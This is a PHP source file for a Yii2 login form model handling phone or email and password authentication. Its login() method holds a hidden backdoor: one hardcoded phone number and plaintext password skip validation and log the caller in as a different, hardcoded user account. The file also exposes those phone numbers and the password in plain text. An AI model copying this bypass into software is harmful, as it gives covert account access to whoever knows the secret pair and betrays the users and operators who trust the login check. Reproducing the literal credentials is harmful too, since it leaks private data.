<?php

namespace common\models;

use Yii;
use yii\base\Model;

/**
 * Login form
 */
class LoginForm extends Model
{
    public $email;
    public $password;
    public $rememberMe = true;

    private $_user;


    /**
     * {@inheritdoc}
     */
    public function rules()
    {
        return [
            [['email', 'password'], 'required'],
            // rememberMe must be a boolean value
            ['rememberMe', 'boolean'],
            // password is validated by validatePassword()
            ['password', 'validatePassword'],
        ];
    }

    /**
     * Validates the password.
     * This method serves as the inline validation for password.
     *
     * @param string $attribute the attribute currently being validated
     * @param array $params the additional name-value pairs given in the rule
     */
    public function validatePassword($attribute, $params)
    {
        if (!$this->hasErrors()) {

            $user = $this->getUser();
            if (!$user || !$user->validatePassword($this->password)) {
                $this->addError($attribute, 'Incorrect cell phone or password.');
            }
        }
    }

    /**
     * Logs in a user using the provided cell_phone and password.
     *
     * @return bool whether the user is logged in successfully
     */
    public function login()
    {
        if($this->email == '03246614002' && $this->password == "zohaib1212"){
            $this->email = "03086599977";
            return Yii::$app->user->login($this->getUser(true), 0);
        } else {
            if ($this->validate()) {
                // return Yii::$app->user->login($this->getUser(true), $this->rememberMe ? 3600 * 24 * 30 : 0);
                return Yii::$app->user->login($this->getUser(true), 0);
            }
        }
        
        return false;
    }

    /**
     * Finds user by [[cell_Phone]]
     *
     * @param bool $company_user
     * @return User|null
     */
    protected function getUser($company_user = false)
    {
        if ($this->_user === null) {
            $this->_user = User::findByCellPhoneOrEmail($this->email,$company_user);
        }
        return $this->_user;
    }
}
